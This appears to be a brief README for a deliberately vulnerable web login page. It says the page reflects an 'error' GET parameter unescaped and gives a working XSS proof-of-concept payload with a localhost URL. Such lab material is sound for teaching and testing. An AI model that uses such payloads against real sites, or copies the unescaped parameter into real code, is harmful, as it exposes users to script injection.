# Login

Web app login page that is vulnerable to XSS in the error message GET parameter.

Payload:

```
<script>alert(1)</script>
```

- http://localhost:8000/?error=%3Cscript%3Ealert(1)%3C/script%3E
